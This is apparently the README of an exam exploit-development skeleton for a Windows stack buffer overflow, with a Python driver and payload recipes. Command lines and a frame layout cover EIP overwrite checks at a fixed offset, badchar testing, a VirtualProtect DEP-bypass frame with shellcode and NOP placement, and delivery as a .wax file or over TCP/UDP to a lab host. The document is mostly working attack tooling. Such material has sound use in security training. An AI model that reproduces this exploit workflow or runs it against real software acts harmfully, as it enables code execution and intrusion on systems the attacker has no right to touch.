# Exam Exploit Skeleton

This directory keeps exploit delivery separate from payload layout.

- `exploit.py` is the driver. It writes bytes to a file or sends them over TCP/UDP.
- `payloads/*.py` are recipes. Each recipe builds one payload shape and returns `bytes`.

That split keeps DEP, badchar, shellcode placement, pivots, and final exploit layouts out
of the main driver.

## EIP Control Check

Build `http://` + `A * offset` + `BBBB` + `C * tail`:

```bash
python3 exam/exploit.py --recipe eip_check --offset 17417 --tail-length 4000 \
  --output exam/file.wax
```

## Badchar Test

Build `http://` + `A * offset` + packed EIP + optional NOP sled + badchar bytes:

```bash
python3 exam/exploit.py --recipe badchars --offset 17417 --eip 0x42424242 \
  --exclude 000a0d --output exam/file.wax
```

## VirtualProtect Skeleton

Build a direct saved-EIP VirtualProtect frame:

```bash
python3 exam/exploit.py --recipe vp_skeleton --offset 17417 \
  --virtualprotect 0x1005d060 \
  --return-addr 0x41414141 \
  --lp-address 0x41414141 \
  --writable 0x10070000 \
  --output exam/file.wax
```

The frame layout is:

```text
prefix
A padding up to saved EIP, optionally ending with shellcode + NOPs
VirtualProtect
return address
lpAddress
dwSize
flNewProtect
lpflOldProtect
C padding
```

To tuck shellcode before EIP:

```bash
python3 exam/exploit.py --recipe vp_skeleton --offset 17417 \
  --virtualprotect 0x1005d060 \
  --return-addr 0x41414141 \
  --lp-address 0x41414141 \
  --writable 0x10070000 \
  --shellcode-file shellcode.bin \
  --pre-nops 32 \
  --output exam/file.wax
```

## TCP/UDP Delivery

The same recipe can be sent instead of written:

```bash
python3 exam/exploit.py --recipe eip_check --offset 17417 \
  --transport tcp --host 192.168.56.101 --port 9999
```

```bash
python3 exam/exploit.py --recipe eip_check --offset 17417 \
  --transport udp --host 192.168.56.101 --port 9999
```

Use `--dry-run` to build and preview without writing or sending.
